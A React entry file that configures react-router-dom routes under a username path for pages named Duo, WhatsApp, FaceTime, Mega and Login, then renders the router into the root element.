import React from 'react'
import ReactDOM from 'react-dom/client'
import App from './App.jsx'
import './index.css'
import {
  createBrowserRouter,
  RouterProvider,
} from "react-router-dom";
import Duo from './Pages/Duo.jsx';
import Mega from './Pages/Mega.jsx';
import Login from './Pages/Login.jsx';
import WhatsApp from './Pages/WhatsApp.jsx';
import FaceTime from './Pages/FaceTime.jsx';



const router = createBrowserRouter([
  {
    path: '/',
    element: <App />,
    children: [
      {
        path: '/:username/duo',
        element: <Duo />
      },
      {
        path: '/:username/whatsapp',
        element: <WhatsApp />
      },
      {
        path: '/:username/facetime',
        element: <FaceTime />
      },
      {
        path: '/:username/mega',
        element: <Mega />
      },
      {
        path: '/:username/login',
        element: <Login />
      },
    ]
  }
])

ReactDOM.createRoot(document.getElementById('root')).render(
  <RouterProvider router={router} />
)
